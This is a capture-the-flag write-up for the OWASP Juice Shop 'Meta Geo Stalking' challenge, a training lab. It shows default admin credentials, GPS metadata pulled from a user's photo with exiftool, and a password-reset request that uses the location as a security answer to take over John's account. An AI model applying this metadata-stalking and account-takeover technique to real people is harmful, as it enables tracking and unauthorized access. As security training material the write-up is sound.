# Meta Geo Stalking

**Description**
Determine the answer to John's security question by looking at an upload of him to the Photo Wall and use it to reset his password via the Forgot Password mechanism.

Style: OSINT
Type: Sensitive Data Exposure

## Solution

First, we must find john username (email address).

We should use our admin credentials (`admin@juice-sh.op`:`admin123`)

So after logging in as `admin@juice-sh.op`, and went to administration page (`/#/administration`) we found that john username (email) is `john@juice-sh.op`

So now we can continue with the challenge of "stalking" the user.

So under `/#/photo-wall` we can see that there is a post that were posted by `@j0hNny`. we see a cocktail (or a juice) and a hiking trail (pretty beautiful).

The image is taken from `assets/public/images/uploads/favorite-hiking-place.png`.

Went on google and read about extracting a `png` metadata, result led to a tool named `exiftool`. Tried it.

Results:
```bash
>>> exiftool favorite-hiking-place.png
ExifTool Version Number         : 12.40
File Name                       : favorite-hiking-place.png
Directory                       : .
File Size                       : 651 KiB
File Modification Date/Time     : 2026:06:12 16:26:02+03:00
File Access Date/Time           : 2026:06:12 16:29:39+03:00
File Inode Change Date/Time     : 2026:06:12 16:27:41+03:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 471
Image Height                    : 627
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Exif Byte Order                 : Little-endian (Intel, II)
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
GPS Version ID                  : 2.2.0.0
GPS Latitude Ref                : North
GPS Longitude Ref               : West
GPS Map Datum                   : WGS-84
Thumbnail Offset                : 224
Thumbnail Length                : 4531
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Pixels Per Unit X               : 3779
Pixels Per Unit Y               : 3779
Pixel Units                     : meters
Image Size                      : 471x627
Megapixels                      : 0.295
Thumbnail Image                 : (Binary data 4531 bytes, use -b option to extract)
GPS Latitude                    : 36 deg 57' 31.38" N
GPS Longitude                   : 84 deg 20' 53.58" W
GPS Position                    : 36 deg 57' 31.38" N, 84 deg 20' 53.58" W
```

So it seams we have a GPS position for the photo... Let search it.
I asked GPT to explain to me how to convert the latitude and longitude, it results at `36.958717,-84.348217` which in a website `https://www.gps-coordinates.net` and it let to this location

***Two Bridge Road, Laurel County, KY, United States of America***

Now, let try to log in as this john guy.
When we got to `/#/forgot-password` it asks for the favorite hiking place.

I tried several times (even by seeing the password plaintext and accessing the `/rest/user/reset-password` endpoint.)

I gave up and searched the internet, found this solution https://github.com/RomanGrewalTV/owasp-juice-shop-solutions/tree/master/solutions/2-stars/meta-geo-stalking.

It says to use the `Daniel Boone National Forest`.

### Request
```python
POST /rest/user/reset-password HTTP/1.1
...
Content-Type: application/json

{
    "email":"john@juice-sh.op",
    "answer":"Daniel Boone National Forest",
    "new":"12345",
    "repeat":"12345"
}
```

And the response was

```python
HTTP/1.1 200 OK
...
Keep-Alive: timeout=5

{
    "user": {
        "id":18,
        "username":"j0hNny",
        "email":"john@juice-sh.op",
        "password":"827ccb0eea8a706c4c34a16891f84e7b",
        "role":"customer",
        "deluxeToken":"",
        "lastLoginIp":"",
        "profileImage":"assets/public/images/uploads/default.svg",
        "totpSecret":"",
        "isActive":true,
        "createdAt":"2026-06-12T13:14:47.497Z",
        "updatedAt":"2026-06-12T13:42:34.727Z",
        "deletedAt":null
    }
}
```